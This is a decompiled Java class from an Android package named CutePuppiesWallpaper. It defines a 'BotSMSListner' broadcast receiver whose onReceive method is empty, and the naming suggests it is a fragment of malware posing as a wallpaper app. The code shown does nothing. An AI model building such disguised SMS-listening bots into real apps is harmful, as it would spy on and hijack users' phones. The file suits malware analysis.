// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class BotSMSListner extends BroadcastReceiver
{
    public void onReceive(final Context context, final Intent intent) {
    }
}
